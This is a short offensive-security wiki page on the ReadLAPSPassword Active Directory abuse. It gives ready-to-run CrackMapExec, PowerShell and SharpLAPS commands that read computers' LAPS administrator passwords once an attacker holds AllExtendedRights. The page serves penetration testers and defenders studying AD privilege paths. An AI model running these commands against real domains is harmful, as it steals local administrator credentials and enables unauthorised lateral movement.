# ReadLAPSPassword

This abuse can be carried out when controlling an object that has `AllExtendedRights` over a target computer. The attacker can then read the LAPS password of the computer account. 

{% tabs %}
{% tab title="First Tab" %}
From UNIX-like systems, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) can be used to retrieve LAPS passwords \(this only works since v5.1.6\).

```bash
# Default command
cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps

# The COMPUTER filter can be the name or wildcard (e.g. WIN-S10, WIN-* etc. Default: *)
cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --module laps -O computer="target-*"
```

There are other alternative like [LAPSDumper](https://github.com/n00py/LAPSDumper) \(Python\) or [this public module](https://github.com/T3KX/Crackmapexec-LAPS) for CrackMapExec.

Impacket's ntlmrelayx also carries that feature, usable with the `--dump-laps`.
{% endtab %}

{% tab title="Windows" %}
This can be achieved with the Active Directory PowerShell module.

```bash
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

[SharpLAPS](https://github.com/swisskyrepo/SharpLAPS) \(C\#\) automates that process. 

```bash
SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1"
```
{% endtab %}
{% endtabs %}

